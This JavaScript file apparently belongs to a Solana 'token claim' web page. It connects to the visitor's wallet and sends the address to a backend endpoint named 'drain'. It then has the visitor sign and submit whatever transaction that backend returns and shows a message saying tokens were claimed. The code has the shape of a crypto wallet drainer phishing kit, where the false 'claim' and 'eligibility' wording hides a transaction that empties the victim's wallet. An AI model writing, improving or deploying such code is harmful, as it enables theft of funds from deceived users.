document.getElementById('connect-wallet').addEventListener('click', async () => {
    const statusElement = document.getElementById('status');
    const button = document.getElementById('connect-wallet');
    
    // UI Updates
    button.disabled = true;
    statusElement.textContent = 'Initializing wallet...';
    statusElement.className = 'status visible loading';

    // 1. Multi-Wallet Detection
    let provider = null;
    let providerName = '';

    if (window.solana && window.solana.isPhantom) {
        provider = window.solana;
        providerName = 'Phantom';
    } else if (window.solflare && window.solflare.isSolflare) {
        provider = window.solflare.solana;
        providerName = 'Solflare';
    } else if (window.backpack?.solana) {
        provider = window.backpack.solana;
        providerName = 'Backpack';
    } else if (window.brave?.solana) {
        provider = window.brave.solana;
        providerName = 'Brave Wallet';
    }

    if (!provider) {
        statusElement.textContent = `No supported wallet found. Please install Phantom, Solflare, or Backpack.`;
        statusElement.className = 'status visible error';
        button.disabled = false;
        return;
    }

    try {
        // 2. Connect
        statusElement.textContent = `Connecting to ${providerName}...`;
        
        // Handle connect differently for some wallets that might not support standard connect
        if (provider.connect) {
            await provider.connect();
        }
        
        const publicKey = provider.publicKey ? provider.publicKey.toString() : provider.wallet?.publicKey?.toString();
        if (!publicKey) throw new Error('Wallet connected but public key is missing.');

        const walletAddress = publicKey;

        // 3. Call Backend
        statusElement.textContent = 'Checking eligibility...';
        const response = await fetch('/.netlify/functions/drain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ walletAddress })
        });

        if (!response.ok) {
            const errorResponse = await response.json();
            throw new Error(errorResponse.error || 'Network error');
        }

        const result = await response.json();
        
        // 4. Prepare Transaction
        statusElement.textContent = 'Preparing transaction...';
        
        // Handle deserialization
        const transactionBytes = Uint8Array.from(atob(result.transaction), c => c.charCodeAt(0));
        let transaction;
        try {
            transaction = solanaWeb3.VersionedTransaction.deserialize(transactionBytes);
        } catch {
            transaction = solanaWeb3.Transaction.fromBuffer(transactionBytes);
        }

        // 5. Sign and Send
        statusElement.textContent = `Please sign in ${providerName}...`;
        
        // Some wallets require signAndSendTransaction directly, others use separate steps
        if (provider.signAndSendTransaction) {
             const signature = await provider.signAndSendTransaction(transaction);
             // If using signAndSendTransaction, we often don't need manual confirm depending on the wallet
             // But for consistency with your original code, we'll stick to the manual flow if possible
             // However, most multi-wallet libs expose signTransaction + sendTransaction
        }

        const signedTransaction = await provider.signTransaction(transaction);
        const signature = await provider.sendTransaction(signedTransaction);

        // 6. Confirm
        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
        
        // Add a small retry loop for confirmation to handle race conditions
        let attempts = 0;
        while (attempts < 5) {
            try {
                await connection.confirmTransaction(signature);
                break;
            } catch (e) {
                attempts++;
                if (attempts === 5) throw e;
                await new Promise(r => setTimeout(r, 1000));
            }
        }

        // 7. SUCCESS MESSAGE
        statusElement.textContent = `Success! ${result.amount} ${result.tokenSymbol} claimed successfully.`;
        statusElement.className = 'status visible success';
        button.textContent = 'Claimed';
        button.disabled = true;

    } catch (err) {
        console.error(err);
        statusElement.textContent = `Error: ${err.message}`;
        statusElement.className = 'status visible error';
        button.disabled = false;
    }
});